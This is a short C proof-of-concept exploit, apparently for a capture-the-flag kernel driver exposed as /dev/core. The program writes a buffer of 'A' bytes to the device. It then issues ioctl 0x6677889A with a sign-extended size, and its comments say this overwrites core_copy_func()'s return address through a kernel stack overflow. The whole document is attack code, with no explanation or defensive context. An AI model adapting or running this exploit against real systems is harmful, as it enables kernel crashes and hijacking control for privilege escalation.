#include <stdio.h>
#include <sys/ioctl.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

int main(){
    int fd = open("/dev/core", O_RDWR);
    char buf[0x100];

    if(fd < 0){
        fprintf(stderr, "[-] File open failed\n");
	return 1;
    }

    printf("[+] /dev/core file opened\n");

    memset(buf, 0x41, 0x40+0x8+0x8+0x8);

    // copy payload data to name(global)
    write(fd, buf, 0x58);
    
    // overwrite core_copy_func() return address
    ioctl(fd, 0x6677889A, 0xffffffffffff0000 | sizeof(buf));

    close(fd);

    return 0;

}
